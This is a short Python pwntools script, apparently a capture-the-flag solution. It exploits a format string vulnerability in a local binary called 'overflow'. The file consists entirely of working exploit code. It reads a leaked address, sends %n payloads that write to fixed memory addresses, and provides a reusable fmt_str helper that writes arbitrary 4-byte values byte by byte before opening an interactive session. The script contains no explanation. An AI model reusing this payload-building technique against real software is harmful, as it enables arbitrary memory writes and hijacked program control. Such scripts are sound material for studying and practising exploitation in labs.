from pwn import *

io = process("./overflow")

c_addr = int(io.recvline(),16)
print hex(c_addr)

def c():
	payload = p32(c_addr) + '%12d%6$n'
	io.sendline(payload)


def a():
	payload = 'aa%8$naa' + p32(0x804A028)
	io.sendline(payload)

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload


def b():
   
    payload = fmt_str(6, 4, 0x0804A02C, 0x12345678)
    print payload
    io.sendline(payload)


b()
io.interactive()